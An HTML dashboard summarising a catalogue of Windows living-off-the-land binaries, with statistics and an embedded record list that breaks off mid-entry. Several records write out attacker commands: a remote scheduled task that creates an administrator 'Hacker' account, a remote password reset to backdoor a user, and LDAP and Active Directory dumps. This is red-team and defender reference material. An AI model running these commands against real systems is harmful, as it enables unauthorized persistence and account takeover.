<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="LOLVERSE - Living Off The Land Binaries Analytics Dashboard">
    <title>LOLVERSE - LOL Binaries Dashboard</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%234cc9f0'/%3E%3Ctext x='50' y='70' font-size='60' fill='white' text-anchor='middle' font-weight='bold'%3ELOL%3C/text%3E%3C/svg%3E">
    
<style>
    :root {
        /* Color Palette */
        --bg-primary: #05070d;
        --bg-secondary: #0e1117;
        --bg-tertiary: #151b26;
        --accent-primary: #4cc9f0;
        --accent-secondary: #ffb703;
        --accent-success: #26de50;
        --accent-danger: #ff006e;
        --text-primary: #eef1fa;
        --text-secondary: #94a3b8;
        --text-muted: #64748b;
        --border-color: rgba(123, 139, 170, 0.2);
        --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.3);
        --shadow-md: 0 10px 25px rgba(0, 0, 0, 0.4);
        --shadow-lg: 0 20px 40px rgba(0, 0, 0, 0.5);
        --font-sans: 'Aptos', 'Inter', 'Segoe UI', -apple-system, system-ui, sans-serif;
    }
    
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    /* ====================
       BODY & GENERAL LAYOUT
       ==================== */
    
    html {
        scroll-behavior: smooth;
    }
    
    body {
        font-family: var(--font-sans);
        background: var(--bg-primary);
        color: var(--text-primary);
        font-size: 0.9rem;
        line-height: 1.5;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
    }
    
    body::before {
        content: '';
        position: fixed;
        inset: 0;
        background: 
            linear-gradient(135deg, rgba(5, 7, 13, 0.9) 0%, rgba(8, 27, 61, 0.85) 50%, rgba(12, 34, 74, 0.9) 100%);
        pointer-events: none;
        z-index: -1;
    }
    
    /* ====================
       TYPOGRAPHY
       ==================== */
    
    h1, h2, h3, h4, h5, h6 {
        font-weight: 600;
        letter-spacing: -0.01em;
        margin-bottom: 0.75rem;
    }
    
    h1 {
        font-size: 2rem;
        background: linear-gradient(135deg, var(--accent-primary), var(--accent-success));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
    }
    
    h2 {
        font-size: 1.4rem;
        color: var(--text-primary);
    }
    
    h3 {
        font-size: 1.1rem;
        color: var(--text-primary);
    }
    
    p {
        color: var(--text-secondary);
        margin-bottom: 0.5rem;
    }
    
    a {
        color: var(--accent-primary);
        text-decoration: none;
        transition: color 0.2s ease;
    }
    
    a:hover {
        color: var(--accent-secondary);
    }
    
    /* ====================
       CONTAINER & LAYOUT
       ==================== */
    
    .container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 1.5rem;
    }
    
    .grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
        gap: 1.2rem;
        margin-bottom: 1.5rem;
    }
    
    .grid.cols-2 {
        grid-template-columns: repeat(2, 1fr);
    }
    
    .grid.cols-3 {
        grid-template-columns: repeat(3, 1fr);
    }
    
    @media (max-width: 900px) {
        .grid.cols-3 {
            grid-template-columns: repeat(2, 1fr);
        }
    }
    
    @media (max-width: 600px) {
        .grid,
        .grid.cols-2,
        .grid.cols-3 {
            grid-template-columns: 1fr;
        }
    }
    
    /* ====================
       CARD COMPONENT
       ==================== */
    
    .card {
        background: rgba(21, 27, 38, 0.6);
        border: 1px solid var(--border-color);
        border-radius: 16px;
        padding: 1.5rem;
        backdrop-filter: blur(20px);
        box-shadow: var(--shadow-md);
        transition: all 0.3s ease;
        position: relative;
        overflow: hidden;
    }
    
    .card::before {
        content: '';
        position: absolute;
        inset: 0;
        background: linear-gradient(135deg, rgba(76, 201, 240, 0.05) 0%, rgba(255, 183, 3, 0.02) 100%);
        pointer-events: none;
    }
    
    .card:hover {
        border-color: var(--accent-primary);
        box-shadow: 0 0 30px rgba(76, 201, 240, 0.15);
        transform: translateY(-4px);
    }
    
    .card > * {
        position: relative;
        z-index: 1;
    }
    
    /* ====================
       HEADER & NAVIGATION
       ==================== */
    
    header {
        background: rgba(14, 17, 23, 0.5);
        border-bottom: 1px solid var(--border-color);
        backdrop-filter: blur(20px);
        padding: 1.5rem 0;
        margin-bottom: 2rem;
        position: sticky;
        top: 0;
        z-index: 100;
        box-shadow: var(--shadow-sm);
    }
    
    .header-content {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 2rem;
    }
    
    .header-brand {
        display: flex;
        align-items: center;
        gap: 0.75rem;
    }
    
    .brand-icon {
        width: 32px;
        height: 32px;
        background: linear-gradient(135deg, var(--accent-primary), var(--accent-success));
        border-radius: 8px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: bold;
        font-size: 1rem;
    }
    
    .brand-text h2 {
        margin: 0;
        font-size: 1.3rem;
    }
    
    .brand-text p {
        font-size: 0.75rem;
        color: var(--text-muted);
        margin: 0;
    }
    
    /* ====================
       STATS CARDS ROW
       ==================== */
    
    .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
        gap: 1rem;
        margin-bottom: 2rem;
    }
    
    .stat-card {
        background: rgba(21, 27, 38, 0.4);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        padding: 1rem;
        text-align: center;
        backdrop-filter: blur(15px);
    }
    
    .stat-card h4 {
        font-size: 0.8rem;
        color: var(--text-muted);
        text-transform: uppercase;
        letter-spacing: 0.05em;
        margin-bottom: 0.5rem;
    }
    
    .stat-card .value {
        font-size: 1.8rem;
        font-weight: 700;
        background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
    }
    
    /* ====================
       SEARCH & FILTER BAR
       ==================== */
    
    .search-bar {
        display: flex;
        gap: 0.75rem;
        flex-wrap: wrap;
        align-items: center;
        margin-bottom: 1.5rem;
        padding: 1rem;
        background: rgba(21, 27, 38, 0.5);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        backdrop-filter: blur(15px);
    }
    
    .search-input {
        flex: 1;
        min-width: 250px;
        padding: 0.7rem 1rem;
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid var(--border-color);
        border-radius: 8px;
        color: var(--text-primary);
        font-size: 0.9rem;
        transition: all 0.2s ease;
    }
    
    .search-input:focus {
        outline: none;
        background: rgba(255, 255, 255, 0.08);
        border-color: var(--accent-primary);
        box-shadow: 0 0 15px rgba(76, 201, 240, 0.2);
    }
    
    .search-input::placeholder {
        color: var(--text-muted);
    }
    
    .filter-buttons {
        display: flex;
        gap: 0.5rem;
        flex-wrap: wrap;
    }
    
    .filter-btn {
        padding: 0.6rem 1rem;
        background: rgba(76, 201, 240, 0.1);
        border: 1px solid var(--accent-primary);
        border-radius: 8px;
        color: var(--accent-primary);
        font-size: 0.85rem;
        cursor: pointer;
        transition: all 0.2s ease;
        white-space: nowrap;
    }
    
    .filter-btn:hover {
        background: rgba(76, 201, 240, 0.2);
    }
    
    .filter-btn.active {
        background: var(--accent-primary);
        color: var(--bg-primary);
        font-weight: 600;
    }
    
    /* ====================
       TABLE STYLING
       ==================== */
    
    .table-wrapper {
        overflow-x: auto;
        overflow-y: auto;
        max-height: 600px;
        border: 1px solid var(--border-color);
        border-radius: 12px;
        scrollbar-width: thin;
        scrollbar-color: var(--accent-primary) rgba(76, 201, 240, 0.1);
    }
    
    .table-wrapper::-webkit-scrollbar {
        width: 10px;
        height: 10px;
    }
    
    .table-wrapper::-webkit-scrollbar-track {
        background: rgba(76, 201, 240, 0.05);
        border-radius: 10px;
    }
    
    .table-wrapper::-webkit-scrollbar-thumb {
        background: var(--accent-primary);
        border-radius: 10px;
    }
    
    .table-wrapper::-webkit-scrollbar-thumb:hover {
        background: var(--accent-secondary);
    }
    
    .table {
        width: 100%;
        border-collapse: collapse;
        font-size: 0.9rem;
    }
    
    .table thead {
        background: rgba(0, 0, 0, 0.3);
        border-bottom: 2px solid var(--border-color);
    }
    
    .table th {
        padding: 1rem;
        text-align: left;
        color: var(--text-secondary);
        font-weight: 600;
        text-transform: uppercase;
        font-size: 0.8rem;
        letter-spacing: 0.05em;
        cursor: pointer;
        user-select: none;
        transition: color 0.2s ease;
    }
    
    .table th:hover {
        color: var(--accent-primary);
    }
    
    .table th.sortable::after {
        content: ' ‚áÖ';
        font-size: 0.8rem;
        opacity: 0.5;
    }
    
    .table th.sorted-asc::after {
        content: ' ‚Üë';
        opacity: 1;
        color: var(--accent-primary);
    }
    
    .table th.sorted-desc::after {
        content: ' ‚Üì';
        opacity: 1;
        color: var(--accent-primary);
    }
    
    .table tbody tr {
        border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        transition: background 0.2s ease;
    }
    
    .table tbody tr:hover {
        background: rgba(76, 201, 240, 0.08);
    }
    
    .table td {
        padding: 0.9rem 1rem;
        color: var(--text-primary);
    }
    
    .table td.muted {
        color: var(--text-secondary);
        font-size: 0.85rem;
    }
    
    /* ====================
       BADGE & TAG STYLES
       ==================== */
    
    .badge {
        display: inline-block;
        padding: 0.3rem 0.7rem;
        border-radius: 20px;
        font-size: 0.75rem;
        font-weight: 600;
        white-space: nowrap;
    }
    
    .badge-type {
        background: rgba(76, 201, 240, 0.2);
        color: var(--accent-primary);
        border: 1px solid var(--accent-primary);
    }
    
    .badge-function {
        background: rgba(255, 183, 3, 0.2);
        color: var(--accent-secondary);
        border: 1px solid var(--accent-secondary);
    }
    
    .badge-mitre {
        background: rgba(38, 222, 80, 0.2);
        color: var(--accent-success);
        border: 1px solid var(--accent-success);
    }
    
    .tag-list {
        display: flex;
        flex-wrap: wrap;
        gap: 0.5rem;
    }
    
    .tag {
        display: inline-block;
        padding: 0.25rem 0.6rem;
        background: rgba(255, 255, 255, 0.08);
        border: 1px solid var(--border-color);
        border-radius: 6px;
        font-size: 0.8rem;
        color: var(--text-secondary);
    }
    
    /* ====================
       INSIGHTS & HIGHLIGHTS
       ==================== */
    
    .insights-list {
        list-style: none;
    }
    
    .insights-list li {
        padding: 0.8rem;
        margin-bottom: 0.5rem;
        background: rgba(76, 201, 240, 0.05);
        border-left: 3px solid var(--accent-primary);
        border-radius: 4px;
        color: var(--text-secondary);
    }
    
    .insights-list li::before {
        content: 'üí° ';
        margin-right: 0.5rem;
    }
    
    /* ====================
       SECTION TITLES
       ==================== */
    
    .section-title {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        margin-bottom: 1.5rem;
        padding-bottom: 1rem;
        border-bottom: 2px solid var(--border-color);
    }
    
    .section-title::before {
        content: '';
        width: 4px;
        height: 24px;
        background: linear-gradient(180deg, var(--accent-primary), var(--accent-secondary));
        border-radius: 2px;
    }
    
    .section-title h2 {
        margin: 0;
    }
    
    /* ====================
       FOOTER
       ==================== */
    
    footer {
        background: rgba(14, 17, 23, 0.5);
        border-top: 1px solid var(--border-color);
        backdrop-filter: blur(20px);
        padding: 2rem;
        margin-top: 3rem;
        text-align: center;
        color: var(--text-muted);
        font-size: 0.85rem;
    }
    
    footer p {
        margin: 0.5rem 0;
    }
    
    .footer-links {
        display: flex;
        justify-content: center;
        gap: 1.5rem;
        margin-top: 1rem;
        flex-wrap: wrap;
    }
    
    /* ====================
       UTILITIES
       ==================== */
    
    .text-muted {
        color: var(--text-muted);
    }
    
    .mt-1 { margin-top: 0.5rem; }
    .mt-2 { margin-top: 1rem; }
    .mt-3 { margin-top: 1.5rem; }
    
    .mb-1 { margin-bottom: 0.5rem; }
    .mb-2 { margin-bottom: 1rem; }
    .mb-3 { margin-bottom: 1.5rem; }
    
    .full-width {
        grid-column: 1 / -1;
    }
    
    .no-records {
        text-align: center;
        padding: 3rem 1rem;
        color: var(--text-muted);
    }
    
    .no-records p {
        font-size: 1rem;
    }
    
    /* ====================
       PAGINATION
       ==================== */
    
    .pagination-container {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 1rem;
        margin-top: 1.5rem;
        padding: 1rem;
        background: rgba(21, 27, 38, 0.5);
        border: 1px solid var(--border-color);
        border-radius: 12px;
        flex-wrap: wrap;
    }
    
    .pagination-info {
        color: var(--text-secondary);
        font-size: 0.9rem;
        white-space: nowrap;
    }
    
    .pagination-controls {
        display: flex;
        gap: 0.5rem;
        align-items: center;
        flex-wrap: wrap;
    }
    
    .pagination-btn {
        padding: 0.5rem 0.8rem;
        background: rgba(76, 201, 240, 0.1);
        border: 1px solid var(--accent-primary);
        border-radius: 6px;
        color: var(--accent-primary);
        font-size: 0.85rem;
        cursor: pointer;
        transition: all 0.2s ease;
        white-space: nowrap;
    }
    
    .pagination-btn:hover:not(:disabled) {
        background: rgba(76, 201, 240, 0.2);
    }
    
    .pagination-btn:disabled {
        opacity: 0.4;
        cursor: not-allowed;
    }
    
    .pagination-btn.active {
        background: var(--accent-primary);
        color: var(--bg-primary);
        font-weight: 600;
    }
    
    .page-info {
        color: var(--text-muted);
        font-size: 0.85rem;
    }
    
    /* ====================
       ANIMATIONS
       ==================== */
    
    @keyframes fadeIn {
        from {
            opacity: 0;
            transform: translateY(10px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }
    
    .card, .stat-card {
        animation: fadeIn 0.3s ease;
    }
</style>

</head>
<body>
    <div class="container">
        <!-- Header -->
        <header>
            <div class="header-content">
                <div class="header-brand">
                    <div class="brand-icon">üéØ</div>
                    <div class="brand-text">
                        <h2>LOLVERSE</h2>
                        <p>Living Off The Land Binaries Analytics</p>
                    </div>
                </div>
            </div>
        </header>

        <!-- Main Content -->
        <main>
            <!-- Statistics Cards -->
            <div class="stats-grid">
    <div class="stat-card">
        <h4>Total Binaries</h4>
        <div class="value">462</div>
    </div>
    <div class="stat-card">
        <h4>Binary Types</h4>
        <div class="value">5</div>
    </div>
    <div class="stat-card">
        <h4>Functions</h4>
        <div class="value">11</div>
    </div>
    <div class="stat-card">
        <h4>Toolsets</h4>
        <div class="value">9</div>
    </div>
    <div class="stat-card">
        <h4>MITRE Techniques</h4>
        <div class="value">44</div>
    </div>
    <div class="stat-card">
        <h4>Contributors</h4>
        <div class="value">1</div>
    </div>
</div>


            <!-- Key Insights -->
            <div class="grid">
                <div class="card">
    <div class="section-title">
        <h2>Key Insights</h2>
    </div>
    <ul class="insights-list">
        <li>Cmdlets is the most common binary type with 220 entries.</li>
        <li>The most common function is &#39;Manage&#39; with 110 binaries.</li>
        <li>&#39;Builtin&#39; toolset is utilized in 285 binaries.</li>
        <li>MITRE technique T1047 is mapped to 135 binaries.</li>
        <li>This dataset contains 462 living-off-the-land binaries curated by 1 contributor(s).</li>
    </ul>
</div>

            </div>

            <!-- Statistics Breakdown -->
            <div class="grid cols-3">
    <div class="card">
        <div class="section-title">
            <h3>Binary Types</h3>
        </div>
        <ul style="list-style: none;">
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Cmdlets</span>
                <span class="badge badge-type">220</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Binaries</span>
                <span class="badge badge-type">142</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>MMC</span>
                <span class="badge badge-type">68</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>WMI</span>
                <span class="badge badge-type">26</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Scripts</span>
                <span class="badge badge-type">6</span>
            </li>
        </ul>
    </div>
    <div class="card">
        <div class="section-title">
            <h3>Primary Functions</h3>
        </div>
        <ul style="list-style: none;">
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Manage</span>
                <span class="badge badge-function">110</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Domain</span>
                <span class="badge badge-function">87</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Network</span>
                <span class="badge badge-function">61</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Data</span>
                <span class="badge badge-function">57</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Execute</span>
                <span class="badge badge-function">29</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Sessions</span>
                <span class="badge badge-function">26</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Processes</span>
                <span class="badge badge-function">26</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Recon</span>
                <span class="badge badge-function">22</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Misc</span>
                <span class="badge badge-function">20</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Logs</span>
                <span class="badge badge-function">15</span>
            </li>
        </ul>
    </div>
    <div class="card">
        <div class="section-title">
            <h3>Top Toolsets</h3>
        </div>
        <ul style="list-style: none;">
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Builtin</span>
                <span class="badge badge-type">285</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>TODO</span>
                <span class="badge badge-type">163</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>CIMSession</span>
                <span class="badge badge-type">162</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>RSAT</span>
                <span class="badge badge-type">103</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>GUI</span>
                <span class="badge badge-type">85</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Sysinternals</span>
                <span class="badge badge-type">23</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Extra</span>
                <span class="badge badge-type">20</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>Server</span>
                <span class="badge badge-type">11</span>
            </li>
            <li style="display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid var(--border-color);">
                <span>PSSession</span>
                <span class="badge badge-type">10</span>
            </li>
        </ul>
    </div>
</div>


            <!-- Main Records Table -->
            <div class="card full-width">
    <div class="section-title">
        <h2>Living Off The Land Binaries</h2>
        <span id="record-count" class="text-muted"></span>
    </div>
    <div class="search-bar">
        <input type="text" id="search-input" class="search-input" placeholder="Search by name, function, or toolset...">
        <div class="filter-buttons" id="filter-buttons"></div>
    </div>
    
    <div class="table-wrapper">
        <table class="table" id="records-table">
            <thead>
                <tr>
                    <th class="sortable" data-sort="name">Name</th>
                    <th class="sortable" data-sort="type">Type</th>
                    <th class="sortable" data-sort="function">Function</th>
                    <th>Toolsets</th>
                    <th class="sortable" data-sort="synopsis">Synopsis</th>
                    <th>MITRE Techniques</th>
                </tr>
            </thead>
            <tbody id="table-body">
            </tbody>
        </table>
    </div>
    
    <div class="pagination-container">
        <div class="pagination-info">
            <span id="pagination-info-text">Showing ‚Äî of 462 records</span>
        </div>
        <div class="pagination-controls">
            <button class="pagination-btn" id="prev-page-btn">‚Üê Previous</button>
            <span class="page-info"><span id="current-page">1</span> of <span id="total-pages">1</span></span>
            <button class="pagination-btn" id="next-page-btn">Next ‚Üí</button>
        </div>
    </div>
</div>

        </main>

        <!-- Footer -->
        <footer>
            <p>LOLVERSE Dashboard - Living Off The Land Binaries Reference</p>
            <p class="text-muted">Data sourced from MITRE ATT&CK Living off the Land Binaries project</p>
            <p class="text-muted">Generated on January 20, 2026 at 12:02:54</p>
        </footer>
    </div>

    <!-- Interactive JavaScript -->
    
<script>
// ============================================================
// LOLVERSE Dashboard - Interactive Data Management
// ============================================================

// Store all records globally
const allRecords = [{"id": 0, "name": "AccessEnum.exe", "type": "Binaries", "function": "Data", "toolsets": ["GUI", "Sysinternals"], "synopsis": "Displays who has access to items within a directory or registry key", "description": "Enumerate share permissions", "commandline": "AccessEnum.exe", "usecases": ["Identify writable files and folders on a share which can be backdoored"], "comments": "Share first needs to be mounted to the local system as a drive; AccessEnum does not support scanning network shares", "resources": [], "mitre_techniques": ["T1083"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 1, "name": "Microsoft.ConfigurationManagement.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra", "GUI"], "synopsis": "Microsoft Configuration Manager (MCM)", "description": "Manage Microsoft Configuration Manager (MCM)", "commandline": "C:\\Program Files (x86)\\Microsoft Endpoint Manager\\AdminConsole\\bin\\Microsoft.ConfigurationManagement.exe", "usecases": ["Collect information about systems", "Deploy software implant to system"], "comments": "Download software, including Configuration Manager console on reference 1\nInstallation instructions on reference 2\nAt the Microsoft Configuration main screen, choose \"Install Configuration Manager console\"\nAdd the `SMS:DebugView` parameter to the commandline to get an additional option (Tools) in the menu\nFormerly known as System Center Configuration Manager (SCCM)", "resources": ["https://www.microsoft.com/en-us/evalcenter/download-microsoft-endpoint-configuration-manager", "https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/install-consoles", "https://http418infosec.com/offensive-sccm-summary"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 2, "name": "RDCMan.exe", "type": "Binaries", "function": "Sessions", "toolsets": ["GUI", "Sysinternals"], "synopsis": "Remote Desktop Connection Manager", "description": "Remote Desktop", "commandline": "RDCMan.exe", "usecases": [], "comments": "Session -> Connect To (Ctrl + Q) -> Enter server name\nSee also [mstsc.exe](../mstsc)", "resources": [], "mitre_techniques": ["T1021.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 3, "name": "ServerManager.exe", "type": "Binaries", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Manage roles and features on servers in the domain", "description": "Server Manager", "commandline": "ServerManager.exe", "usecases": ["Manage roles and features on servers"], "comments": "Add other servers to manage -> DNS -> `DC1.ad.bitsadmin.com` -> Enter -> Arrow -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 5985/TCP\nPort: 5986/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 4, "name": "SmeDesktop.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra", "GUI"], "synopsis": "Windows Admin Center", "description": "Manage machines", "commandline": "C:\\Program Files\\Windows Admin Center\\SmeDesktop.exe", "usecases": ["Manage Certificates, Devices, Events, Files & file sharing, Firewall, Installed apps, Local users & groups, Networks, Performance Monitor, PowerShell, Processes, Registry, Remote Desktop, Roles & features, Scheduled tasks, Services, Storage, Storage Migration Service, Storage Replica, System Insights and Updates"], "comments": "Download and install Windows Admin Center and install it\nUnderlying extensively uses WinRM", "resources": ["https://www.microsoft.com/evalcenter/download-windows-admin-center"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 5, "name": "Ssms.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra", "GUI"], "synopsis": "SQL Server Management Studio (SSMS)", "description": "SQL Server Management Studio (SSMS)", "commandline": "C:\\Program Files (x86)\\Microsoft SQL Server Management Studio 19\\Common7\\IDE\\Ssms.exe", "usecases": ["Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links"], "comments": "Download link in resources\nSee also [SQLServerManager15.msc](../../MMC/SQLServerManager15)", "resources": ["https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 6, "name": "TpmVscMgr.exe", "type": "Binaries", "function": "Misc", "toolsets": ["Builtin", "TODO"], "synopsis": "Create and delete TPM virtual smart cards", "description": "Create virtual smart card", "commandline": "TpmVscMgr.exe create /machine W11.ad.bitsadmin.com /name MyVSC /pin default /adminkey random /generate", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 7, "name": "WinAppDeployCmd.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra"], "synopsis": "Deploy a Universal Windows Platform (UWP) app to any Windows 10 device", "description": "Show the list of installed UWP apps", "commandline": "WinAppDeployCmd.exe list -ip 10.0.10.51", "usecases": [], "comments": "Part of the Windows 10 SDK", "resources": ["https://learn.microsoft.com/en-us/windows/uwp/packaging/install-universal-windows-apps-with-the-winappdeploycmd-tool"], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 8, "name": "adexplorer.exe", "type": "Binaries", "function": "Domain", "toolsets": ["GUI", "Sysinternals"], "synopsis": "Advanced Active Directory (AD) viewer and editor", "description": "Interactively browse LDAP", "commandline": "adexplorer.exe", "usecases": ["Via File -> Connect, connect to a domain controller", "If adexplorer is running in the context of a domain, the \"Connect to\" field can be left empty as it automatically connects to a DC of the current domain", "When User and Password fields are left empty, Kerberos authentication is used"], "comments": "", "resources": ["https://blog.bitsadmin.com/dealing-with-large-bloodhound-datasets", "https://github.com/c3c/ADExplorerSnapshot.py", "https://github.com/lkarlslund/Adalanche"], "mitre_techniques": [], "detections": "Port: 389/TCP\nPort: 636/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 9, "name": "adexplorer.exe", "type": "Binaries", "function": "Domain", "toolsets": ["GUI", "Sysinternals"], "synopsis": "Advanced Active Directory (AD) viewer and editor", "description": "Obtain dump of Active Directory over TLS", "commandline": "adexplorer.exe -snapshot ad.bitsadmin.com:636 ad.bitsadmin.com.dat", "usecases": ["Offline evaluation of the AD to identify vulnerabilities and attack paths"], "comments": "Can be viewed offline using ADExplorer\nCan also be imported to BloodHound format using ADExplorerSnapshot.py or to Adalanche (see references)", "resources": ["https://blog.bitsadmin.com/dealing-with-large-bloodhound-datasets", "https://github.com/c3c/ADExplorerSnapshot.py", "https://github.com/lkarlslund/Adalanche"], "mitre_techniques": [], "detections": "Port: 389/TCP\nPort: 636/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 10, "name": "adrestore.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Sysinternals", "TODO"], "synopsis": "Enumerates deleted (tombstoned) objects in a domain and gives you the option of restoring each one", "description": "TODO", "commandline": "adrestore.exe", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 11, "name": "at.exe", "type": "Binaries", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Schedules commands and programs to run on a computer at a specified time and date", "description": "Execute task", "commandline": "at.exe \\\\W10.ad.bitsadmin.com 06:00 cmd /c \"net user Hacker H4ck#rt /add & net localgroup Administrators Hacker /add", "usecases": ["Create backdoor user or launch implant"], "comments": "Deprecated in favor of [schtasks.exe](../schtasks)", "resources": [], "mitre_techniques": ["T1053.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 12, "name": "at.exe", "type": "Binaries", "function": "Recon", "toolsets": ["Builtin"], "synopsis": "Schedules commands and programs to run on a computer at a specified time and date", "description": "List tasks", "commandline": "at.exe \\\\W10.ad.bitsadmin.com", "usecases": ["List current tasks to identify a name that can be used for a new task to blend in"], "comments": "", "resources": [], "mitre_techniques": ["T1053.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-11-04"}, {"id": 13, "name": "csvde.exe", "type": "Binaries", "function": "Domain", "toolsets": ["Builtin", "TODO"], "synopsis": "Imports and exports data from Active Directory Domain Services (AD DS) using files that store data in the comma-separated value (CSV) format", "description": "Query all users", "commandline": "csvde.exe -m -f users.csv -s DC1.ad.bitsadmin.com -d \"cn=users,DC=ad,DC=bitsadmin,DC=com\" -r \"(objectClass=user)", "usecases": ["Query LDAP over the commandline"], "comments": "Not sure if built-in", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 14, "name": "cusrmgr.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra"], "synopsis": "Manage local user accounts", "description": "Update password", "commandline": "cusrmgr.exe -u TargetUser -P Password1! -m \\\\W10.ad.bitsadmin.com", "usecases": ["Backdoor account"], "comments": "Part of the Windows 2000 Resource Kit", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 15, "name": "cusrmgr.exe", "type": "Binaries", "function": "Manage", "toolsets": ["Extra"], "synopsis": "Manage 